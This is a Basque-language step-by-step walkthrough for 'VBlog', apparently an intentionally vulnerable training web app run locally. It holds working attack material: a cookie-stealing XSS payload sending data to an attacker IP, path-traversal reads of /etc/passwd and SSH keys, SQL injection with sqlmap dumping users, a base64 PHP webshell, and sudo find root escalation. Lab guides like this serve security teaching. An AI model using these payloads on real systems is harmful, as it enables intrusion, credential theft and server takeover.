# VBlog — Gida

> Arkitektura xehetasunak: [arquitecture.md](arquitecture.md)

Gida honek eraso-katea urratsez urrats azaltzen du. Urrats bakoitzak **zer egin** adierazten du — nabigatzailean, terminalean edo DevTools-en — eta **zer espero**.

---

## Abiaraztea

**Terminala:**
```bash
git clone https://github.com/Andonigt04/VBlog.git
cd VBlog
sudo docker compose up --build -d
```

Ireki nabigatzailea eta sartu **http://localhost** helbidean. Bloga kargatu beharko da.

---

## 0. Fasea — Errebistaketa (kontu gabe)

### 1. Urratsa — Aplikazioa arakatu

Ireki **http://localhost** nabigatzailean.

- Nabigatu: irakurri postak, probatu kategoriak, begiratu nabigazio-barra.
- Arreta: **Login** eta **Sign up** botoiak daude. Ez dago administrazio-esteka ikusgairik.
- Ikusi orrialdearen iturburu-kodea (eskuineko klika → Ikusi iturburu-kodea edo `Ctrl+U`). Bilatu iruzkinak, ezkutuko estekak edo metadatuak.

### 2. Urratsa — Ezkutuko bideak enumeratu

**Terminala:**
```bash
gobuster dir -u http://localhost \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html \
  -t 50
```

Itxaron eskaneatua amaitu arte. Hauek aurkitu beharko zenituzke:

| Bide | Egoera | Oharrak |
|---|---|---|
| `/backup` | 200 | Kredentzialak ditu |
| `/debug` | 200 | Informazio teknologikoa |
| `/old` | 302 | `/`-ra birbideratzen du |
| `/internal` | 403 | Forbidden (itxura-tranpa) |
| `/admin` | 302 | `/dashboard`-era birbideratzen du |

### 3. Urratsa — Agerian dauden fitxategiak irakurri

**Nabigatzailea:** Joan **http://localhost/backup** helbidean

Kredentzialak testu arruntean ikusiko dituzu:
```
editor_user=editor01
editor_pass=editor01pass
admin_user=adm01
admin_email=adm01@vblog.local
admin_pass=adm01local

host=postgresql
database=vblog
user=vblog_adm
password=uireh34t34
```

**Gorde hauek.** Ariketa osoan zehar erabiliko dituzu.

**Nabigatzailea:** Joan **http://localhost/debug** helbidean

JSON erantzun bat ikusiko duzu PHP bertsioarekin, datu-base kontrolatzailearekin eta erabiltzaile kopuruarekin. Idatzi balio zehatza — exploit-ak eraikitzen lagunduko dizu geroago.

### 4. Urratsa — Erabiltzaileak enumeratu IDOR bidez

APIak erabiltzaileen datuak agerian uzten ditu saioa hasi gabe.

**Terminala:**
```bash
# 1. erabiltzailea irakurri
curl http://localhost/api/users/1

# Iteratu admina aurkitzeko (normalean 52 inguruko id-a)
for i in $(seq 1 55); do
  echo -n "id=$i: "
  curl -s http://localhost/api/users/$i | grep -o '"role":"[^"]*"'
done
```

Edo **nabigatzailean**, ireki **http://localhost/api/users/1** eta handitu zenbakia URLan `"role":"admin"` aurkitu arte.

**Admin erabiltzailearen espero den irteera:**
```json
{
  "id": 52,
  "name": "adm01",
  "email": "adm01@vblog.local",
  "role": "admin"
}
```

### 5. Urratsa — Ezkutuko azpidomeinuak enumeratu

**Terminala:**
```bash
gobuster vhost -u http://localhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 30
```

Aurkitu beharko zenuke: **dev.vblog.local**

**Gehitu zure hosts fitxategian:**
```bash
echo "127.0.0.1  dev.vblog.local" | sudo tee -a /etc/hosts
```

**Nabigatzailea:** Ireki **http://dev.vblog.local**

Arakatu hiru orriak:
- `/` — ingurune-laburpena (framework, BD, PHP bertsioa)
- `/api-docs.html` — APIaren barne-dokumentazioa endpoint xehetasunekin
- `/logs.html` — aplikazioaren erregistroak BD konexio-kateekin eta eskaeratrazeekin

> `/logs.html`-en BD konexio-kate osoa eta mass assignment eskaeren trazeak aurkituko dituzu — hurrengo faseentzat pista erabilgarriak.

---

## 1. Fasea — Erregistratu eta saioa hasi

### 1. Urratsa — Kontu bat sortu

**Nabigatzailea:** Joan **http://localhost/signup** helbidean

Bete:
- **Username:** `hacker` (edo nahi duzun izena)
- **Password:** `password123`

Egin klik **Create account**-en. Saio hasita hasiera-orrialdera birbideratuko zaituzte.

### 2. Urratsa — Saioa ikuskatu

Ireki **DevTools** (`F12`) → **Application** fitxa → **Cookies** → `http://localhost`

`laravel_session` izeneko cookie bat ikusiko duzu. Ohartu **HttpOnly markatuta ez dagoela** — horrek esan nahi du JavaScriptek cookie hau irakurri dezakeela (3. fasean ustiatu egingo da).

### 3. Urratsa — Zure erabiltzaile-ID eta rola lortu

**Terminala:**
```bash
# Saioa hasi eta cookie-a gorde
curl -c /tmp/cookies.txt -X POST http://localhost/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@example.com","passkey":"password123"}'

# Uneko erabiltzailearen informazioa kontsultatu
curl -b /tmp/cookies.txt http://localhost/api/me
```

**Espero den irteera:**
```json
{"id": 53, "name": "hacker", "email": "...", "role": "user"}
```

Idatzi zure **erabiltzaile-ID-a** (adib., `53`). Hurrengo urratsean erabiliko duzu.

---

## 2. Fasea — Pribilegioen Eskalada (Mass Assignment)

Eguneratze-endpointak bidaltzen duzun edozein eremu onartzen du — `role` barne. Ez dago erabiltzaile arrunt bat admin bilakatzetik eragozteko egiaztatzerik.

### 1. Urratsa — Admin-era eskalatu

**Terminala** (`53` zure ID errealarekin ordeztu):
```bash
curl -b /tmp/cookies.txt -X PUT http://localhost/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**Burp Suite-rekin** ere egin dezakezu:
1. Ireki Burp Suite → Proxy → Intercept ON
2. Nabigatzailean, joan **http://localhost/profile**-era eta egin klik **Save changes**-en (edozein aldaketa)
3. Burp-en, aldatu metodoa `PUT`-era, URLa `/api/update/user/53`-ra eta gorputza `{"role":"admin"}`-ra
4. Birbidali eskaera

### 2. Urratsa — Eskalada egiaztatu

**Terminala:**
```bash
curl -b /tmp/cookies.txt http://localhost/api/me
```

**Espero den irteera:**
```json
{"id": 53, "name": "hacker", "role": "admin"}
```

**Nabigatzailea:** Freskatu orria. Orain **Dashboard** esteka bat ikusi beharko zenuke nabigazio-barran.

### 3. Urratsa — Administrazio-panelera sartu

**Nabigatzailea:** Joan **http://localhost/dashboard** helbidean

APIaren bidez zure rola aldatu duzu arren, dashboard-ak sartzen uzten dizu — autentifikatu zarela soilik egiaztatzen du, baina benetan admin zarela ez (Sarbide-Kontrol Apurtua).

Zerbitzariaren erabiltzaile, post eta iruzkin guztien zerrendak ikusiko dituzu.

---

## 3. Fasea — Stored XSS + Barne-panela

### 1. Urratsa — Iruzkin maltzur bat injektatu

**Nabigatzailea:** Joan edozein blog-postara (hasi-orriko titulu batean klik egin).

Jaitsi iruzkin-formularira arte. **Iruzkinaren testu-koadroan** idatzi:

```html
<script>alert(document.cookie)</script>
```

Egin klik **Post comment**-en.

**Nabigatzailea:** Birkargatu postaren orria. Elkarrizketa-koadro bat agertuko da zure saio-cookiearekin. Honek XSS funtzionatzen duela baieztatzen du.

### 2. Urratsa — Cookie bat lapurtu (kontzeptu-froga)

Benetako eragina erakusteko, cookiea kanpoko zerbitzari batera bidaliko zenuke. Laborategiko ingurunean:

**Terminala — entzule bat hasi:**
```bash
python3 -m http.server 8888
```

**Nabigatzailea:** Argitaratu iruzkin berri bat payload honekin (ordeztu IPa zure makinaren IParekin):
```html
<script>fetch('http://ZURE_IP:8888/?c='+document.cookie)</script>
```

Edozein erabiltzailek (admin bat barne) post hori bisitatzean, haien cookiea zure entzuleraino iritsiko da.

**Terminala:** Begiratu irteerari — honelako eskaera bat ikusiko duzu:
```
GET /?c=laravel_session=eyJ... HTTP/1.1
```

Cookie hori jabeak saioa ordezkatzeko erabil daiteke.

### 3. Urratsa — Barne-panela arakatu

Oraindik egin ez baduzu, gehitu azpidomeinua hosts fitxategian eta ireki:

**Nabigatzailea:** Joan **http://dev.vblog.local/logs.html** helbidean

Irakurri erregistroak arreta handiz. Aurkituko dituzu:
- PostgreSQL konexio-katea kredentzialak barne
- APIra egindako deiaren trazeak, mass assignment saialdiak barne
- Hurrengo fasetarako informazio interno erabilgarri gehiago

---

## 4. Fasea — Admin API: Path Traversal eta SQL Injection

Admin saio aktibo bat behar duzu. Erabili terminaleko cookie-a edo mantendu saioa nabigatzailean.

### 1. Urratsa — Zerbitzariko fitxategiak irakurri (Path Traversal)

**Terminala:**
```bash
# Aplikazioaren .env fitxategia irakurri
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/file?path=.env"

# App direktoritik irten
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/file?path=../../etc/passwd"
```

**Nabigatzailea:** URL-barran ere proba dezakezu zuzenean:
```
http://localhost/api/admin/file?path=../../etc/passwd
```

Erantzunak edukiontziko `/etc/passwd`-a izango du — edozein fitxategi irakurri dezakezula baieztatuz.

Beste fitxategi interesgarri batzuk:
```bash
# Nginx konfigurazioa
curl -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../etc/nginx/nginx.conf"

# SSH gakoak (badaude)
curl -b /tmp/cookies.txt "http://localhost/api/admin/file?path=../../root/.ssh/id_rsa"
```

### 2. Urratsa — SQL errore bat eragin (SQL Injection)

**Terminala:**
```bash
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter='"
```

**Nabigatzailea:** Ireki:
```
http://localhost/api/admin/stats?filter='
```

**500 Internal Server Error** ikusiko duzu PostgreSQL pilaketarekin. Honek `filter` parametroa SQL kontsultara zuzenean injektatzen dela baieztatzen du.

### 3. Urratsa — Itssu injekzioa egiaztatu (denboran oinarritua)

**Terminala:**
```bash
# Eskaera honek gutxienez 3 segundo behar ditu
curl -b /tmp/cookies.txt \
  "http://localhost/api/admin/stats?filter=%25%27%20AND%20(SELECT%201%20FROM%20pg_sleep(3))%3D1%20AND%20%27%25%27%3D%27"
```

Erantzuna ~3 segundo atzeratzen bada, injekzioa baieztatuta dago.

### 4. Urratsa — Datu-basea deskargatu sqlmap-ekin

**Terminala:**
```bash
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="laravel_session=ITSATSI_ZURE_COOKIE_HEMEN" \
  --dbms=postgresql \
  --level=3 --risk=2 \
  --batch \
  --dump -T users
```

Honek `users` taularen errenkada guztiak erauziko ditu, pasahitz-hashak barne.

---

## 5. Fasea — Urrutiko Kode Exekuzioa Fitxategi Igoeraren bidez

Admin igoera-endpointak fitxategiak jatorrizko izenarekin gordetzen ditu direktorio publiko batean. Ez dago luzapenaren egiaztaketarik.

### 1. Urratsa — Webshell bat sortu

**Terminala:**
```bash
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php
```

### 2. Urratsa — Webshell-a igo

**Terminala:**
```bash
curl -b /tmp/cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
```

**Espero den erantzuna:**
```json
{"url": "http://localhost/avatars/shell.php"}
```

### 3. Urratsa — Urrutiko komandoak exekutatu

Shell-ak `cmd` parametroaren bidez base64-n kodifikatutako komandoak onartzen ditu.

**Terminala:**
```bash
# Komando bat kodifikatu
echo -n "id" | base64
# Irteera: aWQ=

# Exekutatu
curl "http://localhost/avatars/shell.php?cmd=aWQ="
# Irteera: uid=33(www-data) gid=33(www-data)
```

**Nabigatzailea:** URL-barran ere proba dezakezu:
```
http://localhost/avatars/shell.php?cmd=aWQ=
```

Komando gehiago:
```bash
# /etc listatzen
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'ls -la /etc/' | base64 -w0)"

# /etc/passwd irakurri
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'cat /etc/passwd' | base64 -w0)"

# Hostname
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'hostname' | base64 -w0)"
```

Orain **Urrutiko Kode Exekuzioa** duzu `www-data` gisa zerbitzarian.

---

## 6. Fasea — Root-era Eskalada

### 1. Urratsa — Sudo-pribilegioak egiaztatu

**Terminala:**
```bash
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'sudo -l' | base64 -w0)"
```

**Espero den irteera:**
```
User www-data may run the following commands on ...:
    (root) NOPASSWD: /usr/bin/find
```

### 2. Urratsa — GTFOBins bidez ustiatu (sudo find)

`find` binariak `-exec`-en bidez komandoak exekuta ditzake. Pasahitzik gabe `find` root gisa exekuta dezakegunez, edozer exekuta dezakegu root gisa.

**Terminala:**
```bash
# Komando bat root gisa exekutatu eta irteera gorde
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'sudo find . -exec /bin/sh -c "id > /tmp/pwned" \; -quit' | base64 -w0)"

# Emaitza irakurri
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'cat /tmp/pwned' | base64 -w0)"
```

**Espero den irteera:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**Root lortu duzu.**

### 3. Urratsa — Alternatiboa: bash SUID

**Terminala:**
```bash
# Egiaztatu rootbash existitzen den
curl "http://localhost/avatars/shell.php?cmd=$(echo -n 'ls -la /tmp/rootbash' | base64 -w0)"

# Exekutatu -p-rekin (UID efektiboa mantendu)
curl "http://localhost/avatars/shell.php?cmd=$(echo -n '/tmp/rootbash -p -c id' | base64 -w0)"
```

**Espero den irteera:**
```
uid=33(www-data) euid=0(root)
```

UID efektiboa 0 da — root sarbidea SUID biten bidez.

---

## Eskalada-katea osoa (laburpena)

```
0. Fasea — Errebistaketa (anonimoa)
  1. Nabigatzailea: http://localhost → aplikazioa arakatu
  2. gobuster dir → /backup, /debug aurkitzen ditu
  3. Nabigatzailea: http://localhost/backup → editor + admin + BD kredentzialak
  4. curl /api/users/1..55 → IDOR, admin aurkitu (id 52)
  5. gobuster vhost → dev.vblog.local
  6. /etc/hosts-era gehitu → http://dev.vblog.local/logs.html

1. Fasea — Erregistroa
  1. Nabigatzailea: http://localhost/signup → kontu sortu
  2. curl /api/me → erabiltzaile-ID eta uneko rola lortu

2. Fasea — Admin (Mass Assignment)
  1. PUT /api/update/user/{id} -d '{"role":"admin"}'
  2. curl /api/me → role: admin ✓
  3. Nabigatzailea: http://localhost/dashboard → sarbidea emanda

3. Fasea — XSS + Barne-Panela
  1. Nabigatzailea: <script>alert(document.cookie)</script> iruzkin gisa argitaratu
  2. Posta birkargatu → cookiea alertan agertzen da
  3. Nabigatzailea: http://dev.vblog.local/logs.html → BD-katea + trazeak

4. Fasea — Admin API
  1. curl /api/admin/file?path=../../etc/passwd → Path Traversal
  2. curl /api/admin/stats?filter=' → SQL errorea (PostgreSQL)
  3. sqlmap → users taularen deskarga osoa

5. Fasea — RCE
  1. shell.php sortu passthru payload-arekin
  2. curl -F file=@shell.php /api/admin/upload → /avatars/shell.php
  3. curl /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)

6. Fasea — root
  1. shell: sudo -l → NOPASSWD: /usr/bin/find
  2. shell: sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
  3. cat /tmp/pwned → uid=0(root) ✓
```
